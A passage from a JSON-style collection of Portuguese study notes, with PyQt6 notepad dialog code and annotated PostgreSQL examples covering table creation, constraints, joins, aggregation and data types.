searchText(self):\n\t\t#Abre uma janela de di\u00e1logo para colocar o que procurar\n\t\tfind_text, ok = QInputDialog.getText(\n\t\t\tself, 'Procurar Texto', 'Procurar:')\n\t\t\n\t\tif ok:\n\t\t\t#Essa lista armazena os dados do TextEdit() modificado\n\t\t\textra_selections = []\n\t\t\t#Especifica para o cursor ir para o in\u00edcio do texto\n\t\t\tself.text_edit.moveCursor(\n\t\t\t\tQTextCursor.MoveOperation.Start)\n\t\t\t\n\t\t\t#Cria um objeto da cor cinza que ser\u00e1 usado para marcado o texto\n\t\t\tcolor = QColor(Qt.GlobalColor.gray)\n\t\t\n\t\t\t#Enquanto o cursor estiver se movimentando \n\t\t\t#Procurar\u00e1 o item que fora pesquisado\n\t\t\twhile(self.text_edit.find(find_text)):\n\t\t\t\t#Especifica que ser\u00e1 mudado \u00e9 um TextEdit()\n\t\t\t\tselection = QTextEdit.ExtraSelection()\n\t\t\t\tselection.format.setBackground(color)\n\t\t\t\t#O que o cursor selecionou, vai ser mudado o estilo\n\t\t\t\tselection.cursor = self.text_edit.textCursor()\n\t\t\t\t#Armazenda o TextEdit() com as modifica\u00e7\u00f5es na lista\n\t\t\t\textra_selections.append(selection)\n\t\t\t\t\n\t\ttry:\n\t\t\tself.text_edit.setExtraSelections(\n\t\t\t\t\t\t\t\t\textra_selections)\n\t\texcept:\n\t\t\tpass\n\t\t\t\n\tdef removeHighlights(self):\n\t\tself.text_edit.setExtraSelections([])\n\t\t\n\tdef chooseFont(self):\n\t\tcurrent = self.text_edit.currentFont()\n\t\t\n\t\t#Op\u00e7\u00f5es fornecidas pelo Qt\n\t\topt = QFontDialog.FontDialogOption.DontUseNativeDialog\n\t\t\n\t\t#Abrindo a caixa de di\u00e1logo\n\t\tfont, ok = QFontDialog.getFont(current, self, options=opt)\n\t\tif ok:\n\t\t\tself.text_edit.setCurrentFont(font)\n\t\t\t\n\tdef chooseFontColor(self):\n\t\tcolor = QColorDialog.getColor()\n\t\t#If importante, para caso o usuario\n\t\t#clicar cancel, retornar\u00e1 False e dar\u00e1 error\n\t\tif color.isValid():\n\t\t\tself.text_edit.setTextColor(color)\n\t\t\t\n\tdef chooseFontBackgroundColor(self):\n\t\tcolor = QColorDialog.getColor()\n\t\t\n\t\tif color.isValid():\n\t\t\tself.text_edit.setTextBackgroundColor(color)\n\t\t\t\n\tdef aboutDialog(self):\n\t\tQMessageBox.about(self, 'Sobre o NotePad',\n\t\t\t\t'''<p> Pr\u00e1tica do PyQt6<\\p>\n\t\t\t\t<p>Projeto 5.1 - NotePagGui<\\p>''')\n\t\t\t\n\t\t\t\n\t\t\t\n\t\t\t\n\t\t\t\n\t\t\t\n\t\t\t\n\t\t\t\n\t\t\t\n\nif __name__ == '__main__':\n\tapp = QApplication(sys.argv)\n\twindow = MainWindow()\n\tsys.exit(app.exec())\n\n"}, "QFileDialog open - Para abrir um arquivo": {"codigo": "\tdef openFile(self):\n\t#no caso abre um arquivo de texto atrav\u00e9z do nome\n\t\tfile_name, _ = QFileDialog.getOpenFileName(\n\t\t\tself, 'Abrir arquivo', '',\n\t\t\t'Text Files (*txt);; HTML Files (*.html)')\n\t\t\t\n\t\tif file_name:\n\t\t\twith open(file_name, 'r') as file:\n\t\t\t\tnotepad_text = file.read()\n\t\t\t\n\t\t\tself.text_edit.setText(notepad_text)", "categoria": "PyQt6"}, "QFileDialog save - Para salvar um arquivo": {"codigo": "\tdef saveToFile(self):\n\t#Nesse caso salva um arquivo de texto\n\t\tfile_name, _ = QFileDialog.getSaveFileName(\n\t\t\tself, 'Salvar arquivo', '',\n\t\t\t'Text Files (*txt);; HTML Files (*.html)')\n\t\t\t\n\t\tif file_name.endswith('.txt'):\n\t\t\tnotepad = self.text_edit.toPlainText()\n\t\t\twith open(file_name, 'w') as file:\n\t\t\t\tfile.write(notepad_text)", "categoria": "PyQt6"}, "QInputDialog - entrada r\u00e1pida de texto": {"codigo": "\tdef searchText(self):\n\t\t#Abre uma janela de di\u00e1logo para colocar o que procurar\n\t\tfind_text, ok = QInputDialog.getText(\n\t\t\tself, 'Procurar Texto', 'Procurar:')\n\t\t\n\t\t#O if serve para verificar se o usu\u00e1rio apertou ok ou cancelar\n\t\tif ok:\n\t\t\tprint(find_text)", "categoria": "PyQt6"}, "QFontDialog - captura a font a ser utilizada": {"codigo": "\tdef chooseFont(self):\n\t\t#Funciona com o que foi selecionado pelo cursor\n\t\tcurrent = self.text_edit.currentFont()\n\t\t\n\t\t#Op\u00e7\u00f5es fornecidas pelo Qt\n\t\topt = QFontDialog.FontDialogOption.DontUseNativeDialog\n\t\t\n\t\t#Abrindo a caixa de di\u00e1logo\n\t\tfont, ok = QFontDialog.getFont(current, self, options=opt)\n\t\tif ok:\n\t\t\tself.text_edit.setCurrentFont(font)", "categoria": "PyQt6"}, "QColorDialog - captura a cor desejada para o texto selecionado": {"codigo": "\tdef chooseFontColor(self):\n\t\t#Funciona com o que foi selecionado pelo cursor\n\t\tcolor = QColorDialog.getColor()\n\t\t#If importante, para caso o usuario\n\t\t#clicar cancel, retornar\u00e1 False e dar\u00e1 error\n\t\tif color.isValid():\n\t\t\tself.text_edit.setTextColor(color)", "categoria": "PyQt6"}, "QColorDialog - backgroundcolor - cor do fundo": {"codigo": "\tdef chooseFontBackgroundColor(self):\n\t#Funciona como marca texto, com o texto selecionado\n\t\tcolor = QColorDialog.getColor()\n\t\t\n\t\tif color.isValid():\n\t\t\tself.text_edit.setTextBackgroundColor(color)", "categoria": "PyQt6"}, "base para os cap\u00edtulos": {"codigo": "https://github.com/anthonydb/practical-sql", "categoria": "SQL "}, "CREATE DATABASE - cria uma base de dados": {"codigo": "CREATE DATABASE nomedabasededados;", "categoria": "SQL "}, "CREATE TABLE - Criando uma tabela e visualizando": {"categoria": "SQL ", "codigo": "\n/*Deletar  uma tabela*/\nDROP TABLE natural_key_example; \n\n\n-- id bigserial, aumenta na tabela cada valor de linha 1,2,3....\n\n/* Cria a tabela especificando o nome de cada coluna\ne o tipo de dado de cada coluna com o numero de \ncaracteres maximos*/\nCREATE TABLE teachers(\n\tid bigserial,\n\tfirst_name varchar(25),\n\tlast_name varchar(50),\n\tschool varchar(50),\n\thire_date date,\n\tsalary numeric\n);\n\n\n--insere para cada linha os dados \n/* a separa\u00e7\u00e3o por v\u00edrgulas e cada coluna especificada na cria\u00e7\u00e3o da tabela\ndatas pade\u00f5es aaa-mm-dd\n*/\nINSERT INTO teachers (first_name, last_name, school, hire_date, salary)\nVALUES ('Janet', 'Smith', 'F.D. Roosevelt HS', '2011-10-30', 36200),\n       ('Lee', 'Reynolds', 'F.D. Roosevelt HS', '1993-05-22', 65000),\n       ('Samuel', 'Cole', 'Myers Middle School', '2005-08-01', 43500),\n       ('Samantha', 'Bush', 'Myers Middle School', '2011-10-30', 36200),\n       ('Betty', 'Diaz', 'Myers Middle School', '2005-08-30', 43500),\n       ('Kathleen', 'Roush', 'F.D. Roosevelt HS', '2010-10-22', 38500);\n\n/*Para ver a tabela\n*/\nSELECT * FROM public.teachers\n\n/*Cria uma tabela tempor\u00e1ria igual a tabela\nselecionada.*/\nCREATE TEMPORARY TABLE supervisor_salaries_temp (LIKE supervisor_salaries);\n\n\n/* A primeira fun\u00e7\u00e3o cria uma coluna com\nvalores n\u00e3o nulos e n\u00e3o repetidos, a segunda\nfun\u00e7\u00e3o, permite que as colunas (), \nn\u00e3o tenha linhas repetidas*/\nCREATE TABLE departments(\n\tdept_id bigserial,\n\tdept varchar(100),\n\tcity varchar(100),\n\tCONSTRAINT dept_key PRIMARY KEY(dept_id),\n\tCONSTRAINT dept_city_unique UNIQUE (dept, city));\n\n\n\nRELACIONAL\nCREATE TABLE employees ( \n\temp_id bigserial, \t\n\tfirst_name varchar(100), \n\tlast_name varchar(100), \n\tsalary integer, \n\tdept_id integer REFERENCES departments (dept_id), \n\tCONSTRAINT emp_key PRIMARY KEY (emp_id), \n\tCONSTRAINT emp_dept_unique UNIQUE (emp_id, dept_id) \n); \n\nINSERT INTO departments (dept, city) \nVALUES \n\t('Tax', 'Atlanta'), \n\t('IT', 'Boston'); \n\nINSERT INTO employees (first_name, last_name, salary, dept_id) \nVALUES \n\t('Nancy', 'Jones', 62500, 1), \n\t('Lee', 'Smith', 59300, 1), \n\t('Soo', 'Nguyen', 83000, 2), \n\t('Janet', 'King', 95000, 2); \n\n\n/* Especificamos que a primeira coluna ser\u00e1\na chave prim\u00e1ria, podemos usar tamb\u00e9m apenas\no PRIMARY KAY nesse caso*/\nCREATE TABLE natural_key_example (\n\tlicense_id varchar(10) CONSTRAINT license_key PRIMARY KEY,\n\tfirst_name varchar(50),\n\tlast_name varchar(50)\n);\n\n\n\n/* Especificando que a primeira coluna \u00e9\na chave primaria, por\u00e9m, agora podemos\nselecionar mais alguma outra coluna como\nchave prim\u00e1ria*/\nCREATE TABLE natural_key_example (\n\tlicense_id varchar(10),\n\tfirst_name varchar(50),\n\tlast_name varchar(50),\n\tCONSTRAINT license_key PRIMARY KEY (license_id)\n);\n\n\n/*Acrescentando dadas o ISO padr\u00e3o \u00e9\nYYYY/MM/DD, caso for mudar, deve usar o\nTO_DATE('22/01/2017', 'DD/MM/YYYY')*/\nINSERT INTO natural_key_composite_example(student_id, school_day, present)\nVALUES(755, '2017/01/22', 'Y');\t\n\n\n\n/*Criamos uma tabela que tem como a chave \nprimaria um numero inteiro bigserial, \nmelhor usar bigserial para armazenar \nas chaves de forma quase infinita*/\nCREATE TABLE surrogate_key_example(\n\torder_number bigserial,\n\tproduct_name varchar(50),\n\torder_date date,\n\tCONSTRAINT order_key PRIMARY KEY(order_number)\n);\n\n\n/* Cria uma tabela que o license_id \u00e9 de acordo com o id\nde outra tabela, licen\u00e7as de carteira de motorista, \nessa licen\u00e7a em outra tabela pode abrigar v\u00e1rios outros  carros,\nj\u00e1 que um motorista pode dirigir v\u00e1rios carros, al\u00e9m disso, \no ON DELETE CASCADE diz que se uma linha for exclu\u00eddo na tabela\ndependente, autumaticamente ser\u00e1 exclu\u00eddo na tebela fornecedora do id,\ntabela pai*/\nCREATE TABLE registrations (\nregistration_id varchar(10),\nregistration_date date,\nlicense_id varchar(10) REFERENCES licenses (license_id) ON DELETE CASCADE,\nCONSTRAINT registration_key PRIMARY KEY (registration_id, license_id)\n);\n\n\n/*Cria uma tabela que cont\u00e9m verifica\u00e7\u00f5es,\ntem o nome da especifica\u00e7\u00e3o e depois a verifica\u00e7\u00e3o \nentre par\u00eanteses, o IN serve para checar se o valor inserio ou \u00e9\nAdmin ou Staff, se n\u00e3o for nenhum dos dois especificados, a inser\u00e7\u00e3o\nser\u00e1 recusada*/\nCREATE TABLE check_contraint_example(\n\tuser_id bigserial,\n\tuser_role varchar(50),\n\tsalary integer,\nCONSTRAINT user_id_key PRIMARY KEY (user_id),\nCONSTRAINT check_role_in_list CHECK (user_role IN('Admin', 'Staff')),\nCONSTRAINT check_salary_not_zero CHECK (salary >0)\n);\n\n\n/*Cria uma tabela que verifica se os dados da coluna \nemail sejam \u00fanicos, isso faz parece uma chave primaria,\nmas \u00e9 diferente, j\u00e1 que o UNIQUE permite valores\nnulos e a chave prim\u00e1ria n\u00e3o permite*/\nCREATE TABLE unique_constraint_example(\n\tcontact_id bigserial CONSTRAINT contenct_id_key PRIMARY KEY,\n\tfirst_name varchar(50),\n\tlast_name varchar(50),\n\temail varchar(200),\nCONSTRAINT email_unique UNIQUE (email)\n);\n\n\n\n/* Cria uma tabela em que a colunas selecionada\nn\u00e3oa aceite termos nulos*/\nCREATE TABLE not_null_example (\n\tstudent_id bigserial,\n\tfirst_name varchar(50) NOT NULL,\n\tlast_name varchar(50) NOT NULL,\n\tCONSTRAINT student_id_key PRIMARY KEY (student_id)\n);\n\n\n/*Quando colocamos detro de \nPRIMARY KEY duas colunas, isso significa que\na chave primaria ser\u00e1 as duas colunas juntas\nque em outras palavras quer dizer que n\u00e3o pode\nter uma combina\u00e7\u00e3o repetida entre os dados\nda coluna (nome-cpf)\n*/\nCREATE TABLE store_sales(\n\tstore varchar(30),\n\tcategory varchar(30) NOT NULL,\n\tunit_sales bigint NOT NULL,\n\tCONSTRAINT store_category_key PRIMARY KEY (store, category)\n);\n\n\n\n\nCREATE TABLE acs_2011_2015_stats(\n\tgeoid varchar(14) CONSTRAINT geoid_key PRIMARY KEY,\n\tcounty varchar(50) NOT NULL,\n\tst, varchar(20) NOT NULL,\n\tpct_travel_60_min numeric(5, 3) NOT NULL,\n\tpct_bachelors_higher numeric(5, 3) NOT NULL,\n\tpct_masters_higher numeric(5, 3) NOT NULL,\n\tmedian_hh_income integer,\n\tCHECK (pct_masters_higher <= pct_bachelors_higher)\n\t);"}, "SELECT - para exploxar os dados": {"categoria": "SQL ", "codigo": "/*seleciona todas as colunas\n*/\nSELECT * FROM teachers;\n\n/*Seleciona as colunas desejadas na ordem que deseja\n*/\nSELECT coluna_1, coluna_2, coluna_3 FROM teachers;\n\n/*na coluna selecionada os valores ser\u00e3o mostrados\napenas uma vez\n*/\nSELECT DISTINCT coluna FROM tabela;\n\n/*nas colunas selecionadas, ordena os dados\nde acordo com a ordem setada pela coluna\nDESC maior para o menor \nASC menor para o maior\n*/\nSELECT first_name, last_name, salary FROM teachers\nORDER BY salary DESC;\n\n/*Aqui ordena primeiro uma coluna e dentro dos dados\nda coluna setada, os outros dados ser\u00e3o organizados\n*/\nSELECT last_name, school, hire_date FROM teachers\nORDER BY school ASC, hire_date DESC;\n\n/*Seleciona os tr\u00eas primeiros ou os tr\u00eas\nselecionados apenas*/\nSELECT geo_name, state_us_abreviation, area_land\nFROM us_counties_2010\nORDER BY area_land DESC\nLIMIT 3;\n\nAqui o nome das colunas est\u00e3o com codigo, voc\u00ea pode\nmudar os nomes das colunas inserindo o nome atual,\nem seguida o nome que deseja.\nEssa altera\u00e7\u00e3o n\u00e3o \u00e9 permanete,\ntoda vez que voc\u00ea precisar exibir a tabela, \ndeve especificar novamente.\n\nSELECT geo_name,\n\tstate_us_abreviation AS \"st\",\n\tp0010001 AS \"Total Population\",\n\tp0010003 AS \"White Alone\",\n\tp0010004 AS \"Black or African American Alone\",\n\tp0010005 AS \"Am Indian/Alaska Native Alone\",\n\tp0010006 AS \"Asian Alone\",\n\tp0010007 AS \"Native Hawaiian and Other Pacific Islander Alone\",\n\tp0010008 AS \"Some Other Race Alone\",\n\tp0010009 AS \"Two or More Races\"\nFROM us_counties_2010;\n\n/*Consulta relacional a partir a chave prim\u00e1ria, pega as duas tabelas e\nas relaciona atrav\u00e9s da chave, retornando uma tabela inteira, composta\npelas duas tabelas */\nSELECT * \nFROM employees JOIN departments\nON employees.dept_id = departments.dept_id;\n\n\n/*RIGHT JOIN e LEFT JOIN, isso signfica que\nser\u00e1 mostrado todas a linhas da tabela direita\nou da tabela esquerca, apresentando nulo \npara as linhas que n\u00e3o tiverem dados corelacionados*/\nSELECT *\nFROM schools_left RIGHT JOIN schools_right\nON schools_left.id = schools_right.id;\n\n/*FULL OUTER JOIN retorna tudo*/\nSELECT *\nFROM schools_left FULL OUTER JOIN schools_right\nON schools_left.id = schools_right.id;\n\n\n/*Retorna todas as combina\u00e7\u00f5es poss\u00edveis*/\nSELECT *\nFROM schools_left CROSS JOIN schools_right\n\n\n/* Vascula onde est\u00e1 nulo*/\nSELECT *\nFROM schools_left LEFT JOIN schools_right\nON schools_left.id = schools_right.id\nWHERE schools_right.id IS NULL;\n\n/*Seleciona a coluna id, da tabela schools_left,\nselcionanda as outras colunas das outras tabelas \nem nome_da_tabela.nome_da_coluna,\ndepois juntas as tabelas com o JOIN,\nem seguida especifica que as tabelas ser\u00e3o \ncomunicadas pela coluna .id*/\nSELECT schools_left.id,\n\t\tschools_left.left_school,\n\t\tschools_right.right_school\nFROM schools_left LEFT JOIN schools_right\nON schools_left.id = schools_right.id;\n\n\n/*Deixando o c\u00f3digo mais limpo*/\nSELECT lt.id,\n\t\tlt.left_school,\n\t\trt.right_school\nFROM schools_left AS lt LEFT JOIN schools_right AS rt\nON lt.id = rt.id;\n\n/*Selecionando v\u00e1ria colunas de v\u00e1rias tabelas*/\n\nSELECT schools_left.id, \n\t\tschools_left.left_school, \n\t\tschools_enrollment.enrollment, \n\t\tschools_grades.grades\nFROM schools_left LEFT JOIN schools_enrollment\nON schools_left.id = schools_enrollment.id\nLEFT JOIN schools_grades\nON schools_left.id = schools_grades.id;\n\n\n/* Fazendo calculos com colunas de duas tabelas*/\nSELECT c2010.geo_name, --Coluna geo_name na tabela \n\t\tc2010.state_us_abreviation AS state, --Coluna na tabela renomeada\n\t\tc2010.p0010001 AS pop_2010, --Coluna renomeada\n\t\tc2000.p0010001 AS pop_2000, --Coluna renomeada\n\t\tc2010.p0010001 - c2000.p0010001 AS raw_change, --Calculo entre colunas\n\t\tround((CAST(c2010.p0010001 AS numeric(8,1)) - c2000.p0010001)\n\t\t/ c2000.p0010001 * 100, 1) AS pct_change -- Retorna uma coluna com %\nFROM us_counties_2010 c2010 INNER JOIN us_counties_2000 c2000 --Tabelas selec\nON c2010.state_fips = c2000.state_fips\nAND c2010.county_fips = c2000.county_fips\nAND c2010.p0010001 <> c2000.p0010001 -- Apenas linhas com popula\u00e7\u00e3o diferente\n--Para ser incluida\nORDER BY pct_change DESC; --Ordena pela porcentagem\n/*O INNER JOIN serve para combinar linha de duas ou mais tabelas\ncom base em condi\u00e7\u00f5es impostas*/\n\nSELECT city, stabr\nFROM pls_fy2014_pupld14a\nGROUP BY city, stabr\nORDER BY city, stabr;\n\n\nSELECT sum(visits) AS visits_2014\nFROM pls_fy2014_pupld14a\nWHERE visits >= 0;\n\n\nSELECT sum(pls14.visits) AS visits_2014,\n\t\tsum(pls09.visits) AS visits_2009\nFROM pls_fy2014_pupld14a pls14 JOIN pls_fy2009_pupld09a pls09\nON pls14.fscskey = pls09.fscskey\nWHERE pls14.visits >= 0 AND pls09.visits >= 0;\n\n\n\nSELECT pls14.stabr, \nsum(pls14.visits) AS visits_2014, \nsum(pls09.visits) AS visits_2009, \nround( (CAST(sum(pls14.visits) AS decimal(10,1)) - sum(pls09.visits)) / \nsum(pls09.visits) * 100, 2 ) AS pct_change\nFROM pls_fy2014_pupld14a pls14 JOIN pls_fy2009_pupld09a pls09 \nON pls14.fscskey = pls09.fscskey \nWHERE pls14.visits >= 0 AND pls09.visits >= 0 \nGROUP BY pls14.stabr \nORDER BY pct_change DESC; \n\n\n\n/* Seleciona as colunas que ser\u00e3o utilizadas nas\ntabelas depois faz as contas de varia\u00e7\u00e3o\nde porcentagem de uma coluna para outra,\njunta as tabelas para an\u00e1lise e aplica as \nrestri\u00e7\u00f5es e identifica linhas que forme maiores\nou iuais a zero, por \u00faltimo agrupa tudo de acordo\ncom a coluna selecionada e ordena pela porcentagem.\n*/\n\nSELECT pls14.stabr,\n\tsum(pls14.visits) AS visits_2014,\n\tsum(pls09.visits) AS visits_2009,\n\tround((CAST(sum(pls14.visits) AS decimal(10, 1)) - sum(pls09.visits)) /\n\t\t sum(pls09.visits) * 100, 2) AS pct_change\nFROM pls_fy2014_pupld14a pls14 JOIN pls_fy2009_pupld09a pls09\nON pls14.fscskey = pls09.fscskey\nWHERE pls14.visits >= 0 AND pls09.visits >= 0\nGROUP BY pls14.stabr\nORDER BY pct_change DESC;\n\n\n/* Seleciona as colunas que ser\u00e3o utilizadas nas\ntabelas depois faz as contas de varia\u00e7\u00e3o\nde porcentagem de uma coluna para outra,\njunta as tabelas para an\u00e1lise e aplica as \nrestri\u00e7\u00f5es e identifica linhas que forme maiores\nou iuais a zero, por \u00faltimo agrupa tudo de acordo\ncom a coluna selecionada e ordena pela porcentagem.\nFiltra os resultados onde a soma agrupada seja maior\nque 50 milh\u00f5es\n*/\nSELECT pls14.stabr,\n\t\tsum(pls14.visits) AS visits_2014,\n\t\tsum(pls09.visits) AS visits_2009,\n\t\tround((CAST(sum(pls14.visits) AS decimal(10, 1)) - sum(pls09.visits)) /\n\t\t\t sum(pls09.visits) * 100, 2) AS pct_change\nFROM pls_fy2014_pupld14a pls14 JOIN pls_fy2009_pupld09a pls09\nON pls14.fscskey = pls09.fscskey\nWHERE pls14.visits >= 0 AND pls09.visits >= 0\nGROUP BY pls14.stabr\nHAVING sum(pls14.visits) > 50000000 \nORDER BY pct_change DESC;\n\n\n\n/* Primeiro selecionamos as colunas das quais vamos\nanalisar, depois especificamos a tabela que essa coluna est\u00e1,\nem seguida agrupamos as colunas com o GROUP BY,\no GROUP BY faz o seguinte:\nEle pega as colunas e verifica linha a linha,\nse os dados das quatros colunas forem \u00fanicos nas linhas\nretornar\u00e1 apenas uma linha, se algum dado for diferente, retornar\u00e1\noutra linha, e resumo o GROUP BY retorna as combina\u00e7\u00f5es possiveis \ndentre todas as colunas em um ou mais linhas\n*/\nSELECT company,\n\t\tstreet,\n\t\tcity,\n\t\tst\nFROM meat_poultry_egg_inspect\nGROUP BY company, street,city, st;\n\n\n\n\n\n\n/* Primeiro selecionamos as colunas das quais vamos\nanalisar, depois especificamos a tabela que essa coluna est\u00e1,\nem seguida agrupamos as colunas com o GROUP BY,\no GROUP BY faz o seguinte:\nEle pega as colunas e verifica linha a linha,\nse os dados das quatros colunas forem \u00fanicos nas linhas\nretornar\u00e1 apenas uma linha, se algum dado for diferente, retornar\u00e1\noutra linha, e resumo o GROUP BY retorna as combina\u00e7\u00f5es possiveis \ndentre todas as colunas em um ou mais linhas.\ncom o count(*) ele cria uma coluna que conta quantas\nvezes foi repetido a linha e o HAVING\nespecifica para mostrar apenas as linhas\nque a coluna count(*) for maior que 1\n*/\nSELECT company,\n\t\tstreet,\n\t\tcity,\n\t\tst,\nCOUNT(*) AS address_count\nFROM meat_poultry_egg_inspect\nGROUP BY company, street,city, st\nHAVING count(*) > 1\nORDER BY count(*) DESC;\n\n\n\n/* Selecionamos a coluna que vamos analisar\nusamos o GROUP BY para agrupar a coluna \nusamos o count(*) para contar quantas\nlinhas distintas agruparam uma linha \ne ordenamos isso\n*/\nSELECT st, \ncount(*) AS st_count\nFROM meat_poultry_egg_inspect\nGROUP BY st\nORDER BY count(*) DESC;\n\n\n\n\nSELECT est_number,\n\t\tcompany,\n\t\tcity,\n\t\tst,\n\t\tzip\nFROM meat_poultry_egg_inspect\nWHERE st IS NULL;\n\n\n\nSELECT company,\n\t\tcount(*) AS company_count\nFROM meat_poultry_egg_inspect\nGROUP BY company\nHAVING count(*) > 1\nORDER BY company ASC;\n\n\n\n/* Selecionamos a coluna que queremos\nconsultar, indicamos qual tabela est\u00e1 essa\ncoluna, colocamos uma restri\u00e7\u00e3o \nWHERE em conjunto com o length()\nessa restri\u00e7\u00e3o age antes de agrupar\nlogo em seguida ocorre o agrupamento \ne conta quantas vezes o st apareceu\n\n*/\n\nSELECT st,\ncount(*) AS st_count\nFROM meat_poultry_egg_inspect\nWHERE length(zip) < 5\nGROUP BY st\nORDER BY st ASC;"}, "WHERE - para filtrar as linhas com base nos criterios de colunas": {"categoria": "SQL ", "codigo": "SELECT column_names\nFROM table_name\nWHERE criteria\nORDER BY column_names;\n\n\n/*mostra os dados apenas quando o crit\u00e9rio\nda coluna \u00e9 atendido\n*/\nSELECT last_name, school, hire_date FROM teachers\nWHERE school = 'Myers Middle School';\n\n/*Primeiro filtra as linhas, depois especifica as colunas\n*/\nSELECT first_name, last_name, school, salary FROM teachers\nWHERE salary < 45000\nORDER BY salary DESC;\n\n/*Procuar as palavras que come\u00e7am com\n'sam', LIKE considera maiuscula e minuscula\nILIKE n\u00e3o considera, '%' significa que\nn\u00e3o importa a quantidade de caracteres que\nvem depois '_' especifica a quantidade \nde caracteres que vem*/\nSELECT first_name FROM teachers\nWHERE first_name ILIKE 'sam%';\n\nSELECT * FROM teachers\nWHERE school = 'F.D. Roosevelt HS'\n\tAND (salary < 38000 OR salary > 40000);\n\n\n= Equal to \nWHERE school = 'Baker Middle' \n\n<> or != Not equal to * \nWHERE school <> 'Baker Middle' \n\n> Greater than \nWHERE salary > 20000 \n\n< Less than \nWHERE salary < 60500 \n\n>= Greater than or equal to \nWHERE salary >= 20000 \n\n<= Less than or equal to \nWHERE salary <= 60500 \n\nBETWEEN Within a range \nWHERE salary BETWEEN 20000 AND 40000 \n\nIN Match one of a set of values \nWHERE last_name IN ('Bush', 'Roush') \n\nLIKE Match a pattern (case sensitive)\n WHERE first_name LIKE 'Sam%' \n\nILIKE Match a pattern (case insensitive) \nWHERE first_name ILIKE 'sam%' \n\nNOT Negates a condition \nWHERE first_name NOT ILIKE 'sam%' \n\n\n\n\n\n/*\nO primeiro select selecionamos todas as colunas que ser\u00e3o \ncriadas na tabela subquery(sup pesquisa), em seguida \nselecionamos uma coluna da tabela temperature_readigs que\ncont\u00e9m as temperaturas em F, usamos o CASE para catalogar\nas temperaturas e finalizamos a coluna \nchamando-a de temperature_group\n\n*/\n\n\nSELECT *\nFROM (\n    SELECT max_temp,\n        CASE \n            WHEN max_temp >= 90 THEN 'Hot'\n            WHEN max_temp BETWEEN 70 AND 89 THEN 'Warm'\n            WHEN max_temp BETWEEN 50 AND 69 THEN 'Pleasant'\n            WHEN max_temp BETWEEN 33 AND 49 THEN 'Cold'\n            WHEN max_temp BETWEEN 20 AND 32 THEN 'Freezing'\n            ELSE 'Inhumane'\n        END AS temperature_group\n    FROM temperature_readings\n) AS subquery\nWHERE temperature_group = 'Inhumane';\n"}, "Error - SQL": {"codigo": "permiss\u00e3o nao concedida - https://www.youtube.com/watch?v=YBzIpirIOY4", "categoria": "SQL "}, "tipos de dados": {"categoria": "SQL ", "codigo": "CREATE TABLE char_data_types ( \n\tvarchar_column varchar(10), \n\tchar_column char(10), \n\ttext_column text \n\nnome das colunas, e a forma que o dado est\u00e1 armazenado\n\nvarchar(10) ser\u00e1 armazenado no maximo 10 carcteres\ne somente os carcteres que forem colocados\n\nchar (10) ser\u00e1 armazenado no maximo 10 caracteres\nporem, quando colocar 3 caracteres, o resto ser\u00e1 \ncaracter espa\u00e7o\n\nvarchar \u00e9 melhor para economizar espa\u00e7o\n\nCREATE TABLE number_data_types ( \n\tnumeric_column numeric(20,5), \n\treal_column real, \n\tdouble_column double precision \n); \nnumeric diz que ser\u00e1 um numero total de 20 digitos\ne desses 20 digitos, 5 s\u00e3o decimais.\nreal \u00e9 uma precis\u00e3o maior dos n\u00famero\ndouble precision \u00e9 uma precis\u00e3o maior ainda\n\nINSERT INTO number_data_types \nVALUES \n\t(.7, .7, .7), \n\t(2.13579, 2.13579, 2.13579), \n\t(2.1357987654, 2.1357987654, 2.1357987654); \nSELECT * FROM number_data_types; \n\nPor enquanto, aqui est\u00e3o tr\u00eas diretrizes a serem consideradas ao lidar com\ntipos de dados num\u00e9ricos:\n1. Use n\u00fameros inteiros quando poss\u00edvel. A menos que seus dados usem decimais, fique\ncom tipos inteiros.\n2. Se voc\u00ea estiver trabalhando com dados decimais e precisar que os c\u00e1lculos sejam exatos\n(lidando com dinheiro, por exemplo), escolha num\u00e9rico ou equivalente,\ndecimal. Os tipos flutuantes economizar\u00e3o espa\u00e7o, mas a inexatid\u00e3o da matem\u00e1tica de ponto flutuante n\u00e3o ser\u00e1 aprovada em muitas aplica\u00e7\u00f5es. Use-os apenas\nquando a exatid\u00e3o n\u00e3o \u00e9 t\u00e3o importante.\n3. Escolha um tipo de n\u00famero grande o suficiente. A menos que voc\u00ea esteja projetando um\nbanco de dados para armazenar milh\u00f5es de linhas, opte por ser maior. Quando\nusando num\u00e9rico ou decimal, defina a precis\u00e3o grande o suficiente para\nacomodar o n\u00famero de d\u00edgitos em ambos os lados do decimal\napontar. Com n\u00fameros inteiros, use bigint, a menos que tenha certeza absoluta\nos valores da coluna ser\u00e3o restritos para caber no n\u00famero inteiro menor ou\ntipos smallint\n\nDatas\n/* Inicia uma tabela que tenha os tipos de data\ntimestamp \u00e9 a data e a hora e o time zone\n\u00e9 o hor\u00e1rio local, interval \u00e9 o intervalo \nde datas, apenas isso */\nCREATE TABLE date_time_types(\n\ttimestamp_column timestamp with time zone,\n\tinterval_column interval);\n\nINSERT INTO date_time_types\nVALUES \n\t('2018-12-31 01:00 EST','2 days'),\n\t('2018-12-31 01:00 -8','1 month'),\n\t('2018-12-31 01:00 Australia/Melbourne','1 century'),\n\t(now(), '1 week');\n\nFormato da Organiza\u00e7\u00e3o para Padroniza\u00e7\u00e3o (ISO) para datas e horas: AAAAMM-DD HH:MM:SS. SQL suporta formatos de data adicionais (como MM/DD/AAAA\n\n/* Calculos com datas, seleciona a coluna 1 e coluna dois, coluna 1 - coluna 2\nresultado para cada linha, coluna new_date*/\n\nSELECT timestamp_column,interval_column, timestamp_column - interval_column AS new_date\nFROM date_time_types;\n\n\n/*Os dados em data ser\u00e3o mudados para data so que str()\n*/\nSELECT timestamp_column, CAST(timestamp_column AS varchar(10))\nFROM date_time_types;\n\n/* selecionando uma columa numeric,\ne trasnformando os dados para inteiros\ne na coluna seguinte em varchar(7)*/\nSELECT numeric_column,\n\tCAST(numeric_column AS integer),\n\tCAST(numeric_column AS varchar(7))\nFROM number_data_types;\n\t\n\n/*Os dois s\u00e3o a mesma coisa*/\n\nSELECT timestamp_column, CAST(timestamp_column AS varchar(10))\nFROM date_time_types;\n\nSELECT timestamp_column, timestamp_column :: varchar(10)\nFROM date_time_types;\n\n\n\n\n\n"}, "Importando e Exportando Dados": {"categoria": "SQL ", "codigo": "1. Prepare os dados de origem na forma de um arquivo de texto delimitado.\n2. Crie uma tabela para armazenar os dados.\n3. Escreva um script COPY para realizar a importa\u00e7\u00e3o.\n\nPara armazenar um arquivo, as colunas ser\u00e3o separadas por virgula(CSV)\ne quando um dado tiver v\u00edrgula em seu nome, precisar\u00e1 estar entre aspas\npois dessa forma o software ignora a virgula dentro do 